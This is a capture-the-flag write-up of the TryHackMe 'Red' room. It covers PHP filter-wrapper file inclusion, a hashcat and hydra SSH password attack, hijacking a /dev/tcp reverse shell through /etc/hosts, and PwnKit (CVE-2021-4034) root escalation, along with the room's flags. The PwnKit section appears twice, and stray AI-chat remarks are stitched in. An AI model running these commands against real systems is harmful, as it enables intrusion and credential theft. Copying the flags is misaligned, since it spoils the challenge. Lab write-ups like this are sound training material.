# Red
The match has started, and Red has taken the lead on you.
But you are Blue, and only you can take Red down.

However, Red has implemented some defense mechanisms that will make the battle a bit difficult:

1. Red has been known to kick adversaries out of the machine. Is there a way around it?
2. Red likes to change adversaries' passwords but tends to keep them relatively the same.
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!

This is a unique battle, and if you feel up to the challenge. Then by all means go for it!

---

Nmap scan

```abap
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Image 1
<img width="1858" height="967" alt="Screenshot From 2025-09-08 20-16-49" src="https://github.com/user-attachments/assets/eb3dfc34-24da-482c-964b-4df151966849" />

Seeing the source code shows nothing and the page is empty but the url shows some promise of **LFI**

running a `diresearch` shows

```abap
[01:15:42] 200 -    2KB - /about.html
[01:15:54] 301 -  303B  - /assets  ->  http://red.thm/assets/
[01:15:54] 200 -  476B  - /assets/
[01:15:59] 200 -    2KB - /contact.html
[01:16:06] 200 -    4KB - /home.html
[01:16:21] 200 -  675B  - /readme.md
[01:16:21] 200 -  388B  - /readme.txt
[01:16:24] 200 -    2KB - /signup.html
[01:16:24] 200 -    2KB - /signin.html
```

But that dosent show much. However we go back to the url and we try `red.thm/index.php?page=../../../../etc/passwd`  and the page comes back empty. So that means we have to confirm if it truly works in the back end. So we run `curl -I red.thm/index.php?page=../../../../etc/passwd`

```abap
HTTP/1.1 302 Found
Date: Tue, 09 Sep 2025 00:52:53 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: /index.php?page=home.html
Content-Type: text/html; charset=UTF-8
```

We get back a status code of 302. Which means the requested resource has been temporarily moved to a different URL.  So I can work with this to possible get a shell. To check out the contents of index.php, we access it by passing it as a parameter and using a PHP wrapper to convert its content to base64.

```abap
curl http://red.thm/index.php?page=php://filter/convert.base64-encode/resource=index.php -o index.php
```

We now have the index.php

```abap
root@ip-10-201-16-46:~# curl http://red.thm/index.php?page=php://filter/convert.base64-encode/resource=index.php -o index.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   468  100   468    0     0   152k      0 --:--:-- --:--:-- --:--:--  152k
root@ip-10-201-16-46:~# base64 --decode index.php
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

Next, we decode the content and see that the passed parameter is indeed sanitized. First, it has to start with a string ranging from a to z. Then "../" will be removed and after that "./" will be removed. This can be easily bypassed by using a PHP wrapper again. Instead of accessing the /etc/passwd/ file via navigation outside of the directory using "../" we directly access it. To prove our assumption, we rewrite the index.php by setting the \$page parameter to our liking and print the checks as well as the result after the sanitization

```abap
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = "php://filter/resource=/etc/passwd"

print isset($page);
print preg_match("/^[a-z]/", $page);
print "<p>";
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    print $page;
}
?>
```

Now, we are  able to retrieve the /etc/passwd file from the machine using the PHP wrapper php\://filter/resource=

```abap
curl http://red.thm/index.php?page=php://filter/resource=/etc/passwd
```

```abap
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

We see that theres a red and blue user. However looking back at the hints above we see this. So that means the passwords have been changed but only slightly

```abap
1. Red has been known to kick adversaries out of the machine. Is there a way around it?
2. Red likes to change adversaries' passwords but tends to keep them relatively the same.
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!
```

```abap
curl http://red.thm/index.php?page=php://filter/resource=/home/blue/.bash_history
```

```abap
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

Checking out the `.bash_history` of blue, we see that a pass list was generated with the file `.reminder` as the base and the `best64.rule` ruleset by using Hashcat

```abap
curl http://red.thm/index.php?page=php://filter/resource=/home/blue/.reminder
```

Now we got a password!

```abap
sup3r_p@s$w0rd!
```

But now we have to use the same Hashcat command above to generate a password list to get into blues account

```abap
echo "sup3r_p@s$w0rd!" > password.txt

hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
#### If you are using THM attack box use this ####
hashcat --stdout password.txt -r /opt/hashcat/rules/best64.rule > passlist.txt 
```

this is the `passlist.txt`

```abap
sup3r_p@s$w0rd!
!dr0w$s@p_r3pus
SUP3R_P@S$W0RD!
Sup3r_p@s$w0rd!
sup3r_p@s$w0rd!0
sup3r_p@s$w0rd!1
sup3r_p@s$w0rd!2
sup3r_p@s$w0rd!3
sup3r_p@s$w0rd!4
sup3r_p@s$w0rd!5
sup3r_p@s$w0rd!6
sup3r_p@s$w0rd!7
sup3r_p@s$w0rd!8
sup3r_p@s$w0rd!9
sup3r_p@s$w0rd!00
sup3r_p@s$w0rd!01
sup3r_p@s$w0rd!02
sup3r_p@s$w0rd!11
sup3r_p@s$w0rd!12
sup3r_p@s$w0rd!13
sup3r_p@s$w0rd!21
sup3r_p@s$w0rd!22
sup3r_p@s$w0rd!23
sup3r_p@s$w0rd!69
sup3r_p@s$w0rd!77
sup3r_p@s$w0rd!88
sup3r_p@s$w0rd!99
sup3r_p@s$w0rd!123
sup3r_p@s$w0rd!e
sup3r_p@s$w0rd!s
sup3r_p@s$w0rda
sup3r_p@s$w0rs
sup3r_p@s$w0ra
sup3r_p@s$w0rer
sup3r_p@s$w0rie
sup3r_p@s$w0o
sup3r_p@s$w0y
sup3r_p@s$w0123
sup3r_p@s$w0man
sup3r_p@s$w0dog
1sup3r_p@s$w0rd!
thesup3r_p@s$w0rd!
dup3r_p@s$w0rd!
map3r_p@s$w0rd!
sup3r_p@s$w0rd!
sup3r_p@s$w0rd!
sup3r_p@s$w0rd!
su3r_p@s$w0rd!
sur_p@s$w0rd!
supr_p@s$w0rd!
sup3_p@s$w0rd!
supr
sup3r1
sup3r_p@s$w0rd
sup3r_p@s$w0r
sup3r_p@s$w0
sup3r_p@s$w0sup3r_p@s$w0
sp3r_p@s$w0
w0rd
s$w0rd!p3r_p@
sup3r_p@s$w0!
cup3r_p@s$w0r
rd!sup3r_p@s$w0
0rd!
w0rd!
$w0r$w0r
sup3
3rs3rs
{up3r_p@s$w0rd!
v3r_p@s$w0rd!
sup3p@
suprsupr
3rs
suw0suw0
swp@
sup3rp
s_p@s$
```

Then we use hydra with the password list we have

```abap
hydra -l blue -P passlist.txt red.thm -t 4 ssh
### For everyone this password will be different ###
[22][ssh] host: red.thm   login: blue   password: sup3r_p@s$w0rd!9
```

After you login with that password we can get the flag quickly but then you are logged out since the password rotate quickly.

> THM{Is\_thAt\_all\_y0u\_can\_d0\_blU3?}

So getting the password again the same way we did above we log back in and if we wait a minute we start getting taunting messages.

To monitor running processes for potential privilege escalation vectors, I wanted to use `pspy64`. The binary was already available on my attack box at:

```
/opt/static-binaries/linux/x86_64/pspy64
```

I started a simple Python web server on my attack box to serve the file:

```bash
cd /opt/static-binaries/linux/x86_64
python3 -m http.server 1234
```

From the target machine as the `blue` user, I then downloaded the binary directly into `/tmp` (a writable directory):

```bash
wget <http://<MACHINE_IP>:1234/pspy64> -O /tmp/pspy64
```

After downloading, I made it executable and ran it:

```bash
chmod +x /tmp/pspy64
/tmp/pspy64
./pspy64
```

This allowed me to observe all processes running on the system, including those started by other users and scheduled tasks, which is very useful for identifying privilege escalation opportunities.

After running it for a bit this came out interesting

```abap
2025/09/09 02:35:01 CMD: UID=1001 PID=14838  | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
```

The given command attempts to establish a reverse shell connection to a remote server at `redrules.thm` on port `9001`, allowing interactive access to the remote shell from the user's local machine. The `nohup` ensures the connection persists even after the user's session ends.

```abap
2025/09/09 02:36:01 CMD: UID=0    PID=14846  | /usr/bin/bash /root/defense/backup.sh 
2025/09/09 02:37:01 CMD: UID=0    PID=14873  | /usr/bin/bash /root/defense/talk.sh 
```

It seems that the script talk.sh is used to leave messages on our command prompt and backup.sh to restore some files. Also, the permissions and attributes of /etc/hosts are adjusted. Processes are being tracked and killed.

So let's check the /etc/hosts file. Maybe we are able to check where redrules.thm resolves to and be able to reroute it to catch the reverse shell of the user red. Checking out the write permissions, it is possible for others to read and write to the file.

So, redrules.thm resolves to 192.168.0.1. Trying to edit the file with an editor like Nano or Vim we get the error, that there is a problem with the history file.

```abap
blue@red:/tmp$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
blue@red:/tmp$ 
```

Next, we try to set up a listener on port 9001, and rewrite the host file by resolving `redrules.thm` to our attacker's machine IP

we append the line `<MACHINE_IP> redrules.thm` to the `/etc/hosts` file using tee. First, it was easily overseen, but `/usr/bin/chattr -a /etc/hosts` and `/usr/bin/chattr +a /etc/hosts`are being called in the background regularly. So the "append-only" attribute (a) to the /etc/hosts file on a Linux system is being added and removed. So the only way of manipulating the /etc/hosts is to append the needed data to it.

```abap
echo '10.201.16.159 redrules.thm' >> /etc/hosts
```

```abap
blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
10.201.16.159 redrules.thm
```

After waiting some time, the command `bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &` gets executed again, then we should have another shell. It took me a couple tries and a little bit but I promise it works.

Flag

> THM{Y0u\_won't\_mak3\_IT\_furTH3r\_th\@n\_th1S}

After getting the flag lets esculate the privileges

```abap
red@red:~$ find / -perm -4000 -type f -ls 2>/dev/null
   418507     32 -rwsr-xr-x   1 root     root        31032 Aug 14  2022 /home/red/.git/pkexec
```

`cd .git` gets us into the `.git` directory and we check the `pkexce`  version

```abap
red@red:~/.git$ ./pkexec --version
pkexec version 0.105
```

[https://www.exploit-db.com/exploits/50689](https://www.exploit-db.com/exploits/50689)

There is a exploit for that for the exploit to work, we just modify the `exploit.c` file by replacing the line

`#define BIN "/usr/bin/pkexec"` with `#define BIN "/home/red/.git/pkexec"`

### Privilege Escalation with PwnKit (CVE-2021-4034)

During privilege escalation enumeration, I found that `/usr/bin/pkexec` was present and set-uid root. Checking its version showed it was **0.105**, which is vulnerable to **CVE-2021-4034**, known as *PwnKit*. This bug in polkit’s `pkexec` allows local privilege escalation from an unprivileged user to root by exploiting how it mishandles arguments and environment variables.

---

### Preparing the Exploit

On my **attack box** I had access to the exploit code and compiled two components:

* `exploit` → the binary that triggers the vulnerable pkexec path.
* `evil.so` → a malicious shared object that gets loaded to execute a shell.

I verified they compiled without fatal errors.

To adapt the proof of concept to this environment, I modified the `exploit.c` source file. Specifically, I replaced the line:

```c
#define BIN "/usr/bin/pkexec"
```

with:

```c
#define BIN "/home/red/.git/pkexec"
```

This ensured the exploit would target the `pkexec` binary in the right location on the system. After that adjustment, I compiled the files successfully.

To make them available to the target machine, I hosted them with a Python HTTP server:

```bash
python3 -m http.server 9000
```

This exposed the current directory at `http://<ATTACK_BOX_IP>:9000/`.

---

### Transferring to the Target

From my shell on the target (`red@red`), I pulled the files into `/tmp` using `wget`:

```bash
wget <http://10.201.16.159:9000/exploit> -O exploit
wget <http://10.201.16.159:9000/evil.so> -O evil.so
```

Initially I got a `Permission denied` when trying to run `./exploit`, so I corrected it:

```bash
chmod +x exploit
```

Now the binary was executable.

---

### Executing the Exploit

Running the exploit:

```bash
./exploit
```

spawned a root shell. I confirmed this by checking my effective user:

```
# whoami
root
```

At this point, I had full root privileges on the target.

---

### Retrieving the Flag

After upgrading my shell with Python’s pty module for stability:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

I navigated to the root directory, listed its contents, and found the flag:

```bash
cd /root
ls
cat flag3
```

Flag obtained:

```
THM{Go0d_Gam3_Blu3_GG}
```

Got it — here’s the updated full write-up section with that detail included. I’ve slotted it naturally into the **Preparing the Exploit** part so it flows with the rest of your notes:

---

### Privilege Escalation with PwnKit (CVE-2021-4034)

During privilege escalation enumeration, I found that `/usr/bin/pkexec` was present and set-uid root. Checking its version showed it was **0.105**, which is vulnerable to **CVE-2021-4034**, known as *PwnKit*. This bug in polkit’s `pkexec` allows local privilege escalation from an unprivileged user to root by exploiting how it mishandles arguments and environment variables.

---

### Preparing the Exploit

On my **attack box** I had access to the exploit code and compiled two components:

* `exploit` → the binary that triggers the vulnerable pkexec path.
* `evil.so` → a malicious shared object that gets loaded to execute a shell.

To adapt the proof of concept to this environment, I modified the `exploit.c` source file. Specifically, I replaced the line:

```c
#define BIN "/usr/bin/pkexec"

```

with:

```c
#define BIN "/home/red/.git/pkexec"

```

This ensured the exploit would target the `pkexec` binary in the right location on the system. After that adjustment, I compiled the files successfully.

To make them available to the target machine, I hosted them with a Python HTTP server:

```bash
python3 -m http.server 9000

```

This exposed the current directory at `http://<ATTACK_BOX_IP>:9000/`.

---

### Transferring to the Target

From my shell on the target (`blue@red`), I pulled the files into `/tmp` using `wget`:

```bash
wget <http://10.201.16.159:9000/exploit> -O exploit
wget <http://10.201.16.159:9000/evil.so> -O evil.so

```

Initially I got a `Permission denied` when trying to run `./exploit`, so I corrected it:

```bash
chmod +x exploit

```

Now the binary was executable.

---

### Executing the Exploit

Running the exploit:

```bash
./exploit

```

spawned a root shell. I confirmed this by checking my effective user:

```
# whoami
root

```

At this point, I had full root privileges on the target.

---

### Retrieving the Flag

After upgrading my shell with Python’s pty module for stability:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

I navigated to the root directory, listed its contents, and found the flag:

```bash
cd /root
ls
cat flag3

```

Flag obtained:

```
THM{Go0d_Gam3_Blu3_GG}

```

---

---

Do you also want me to append a **Mitigation & Detection** section here, so your write-up looks more like a professional pentest report (not just exploitation steps)?
